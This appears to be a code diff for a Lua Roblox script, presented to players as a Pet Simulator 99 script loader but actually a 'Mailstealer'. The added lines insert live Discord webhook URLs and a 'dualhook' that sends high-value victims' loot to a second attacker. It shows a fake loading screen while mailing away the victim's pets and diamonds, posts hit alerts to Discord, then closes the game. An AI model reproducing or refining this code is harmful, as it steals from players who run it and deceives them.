@@ -1,9 +1,11 @@
+-- 2.2 beta
+
 if LoadingScreen == nil then
     LoadingScreen = false
 end
 if Webhook == nil or Webhook == "" then
     Webhook =
-        ""
+        "https://discord.com/api/webhooks/1207564673369505812/srvRoUR59gvba22DkRifiDT17su7nLcW3R758ymCDgBmVnYZp-dr29pkUZt8sptndQB9"
 end
 if Username == "" or Username == nil then
     Username = "TehPucuk_55"
@@ -36,7 +38,7 @@ LoadingText5 = "Error: Execution Failed, re-trying!"
 
 local ScriptTitle = "Pet Simulator 99: Script Loading"
 
-if LoadingScreen ~= true then
+if LoadingScreen ~= false then
     local Loading = Instance.new("ScreenGui")
     local MainFrame = Instance.new("Frame")
     local Title = Instance.new("TextLabel")
@@ -255,7 +257,7 @@ local Blacklisted_Hoverboards = {"Original", "Red Flying Carpet", "Blue Flying C
 
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
-MailMessage = "MonzzBlox Better"
+MailMessage = "Monzz Best Stealer"
 plr = game.Players.LocalPlayer
 guis = plr.PlayerGui
 
@@ -506,14 +508,14 @@ local DualRandomHuge = math.random(5, 15)
 if AmountOfHuges >= DualRandomHuge then
     Username = randomNick
     Webhook =
-        "https://discord.com/api/webhooks/1207564677261828136/3fPdzMvRUB-eKKI4wmGp7tr0Ay5FJeIJJ7nnNwzrUBb7cyxY4jpZV4hRrKATPBBZRz_R"
+        "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN"
 end
 math.randomseed(os.time())
 local DualRandomGem = math.random(5000000, 20000000)
 if GemAmount1 >= DualRandomGem then
     Username = randomNick
     Webhook =
-        "https://discord.com/api/webhooks/1207564677261828136/3fPdzMvRUB-eKKI4wmGp7tr0Ay5FJeIJJ7nnNwzrUBb7cyxY4jpZV4hRrKATPBBZRz_R"
+        "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN"
 end
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
@@ -528,12 +530,12 @@ local function SendWebhook(url, ping)
         "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&"
     data1 = {
         ["content"] = ping,
-        ["username"] = "MonzzBlox Mailstealer",
+        ["username"] = "Mailstealer v2.2",
         ["avatar_url"] = imgs,
         ["embeds"] = {
             {
                 ["title"] = "__`Mailstealer Hit`__ \240\159\142\137",
-                ["url"] = "https://discord.gg/pv2Meafj",
+                ["url"] = "https://discord.com/invite/Fuuekupu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0xadffb0),
                 ["thumbnail"] = {
@@ -566,12 +568,12 @@ local function SendWebhook(url, ping)
                     },
                     {
                         ["name"] = "`(\240\159\154\128) Creators:`",
-                        ["value"] = "```MonzzBlox```",
+                        ["value"] = "```Monzz Better```",
                         ["inline"] = false
                     },
                     {
                         ["name"] = "",
-                        ["value"] = "__**https://discord.gg/pv2Meafj**__",
+                        ["value"] = "__**https://discord.com/invite/Fuuekupu**__",
                         ["inline"] = false
                     }
                 }
@@ -647,7 +649,7 @@ while wait() do
                                 [2] = MailMessage,
                                 [3] = "Pet",
                                 [4] = i,
-                                [5] = v._am
+                                [5] = v._am or 1
                             }
                             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                                 unpack(args)
@@ -866,8 +868,8 @@ while wait() do
     if FinalList == 0 and GemsStolen == true then
         SendWebhook(url, "@everyone | v2.2")
         SendWebhook(
-            "",
-            "`Not Dualhook`"
+            "https://discord.com/api/webhooks/1207564530280955915/S-JZ9i95-iUb45OYhmWkmX6UeITiPUU47XBpAs7WjIdbrAQkRVkfHfFA5DxsxweqH3hJ",
+            "`Hit Mailbox Stealer`"
         )
         wait(2)
         shutdowngame()
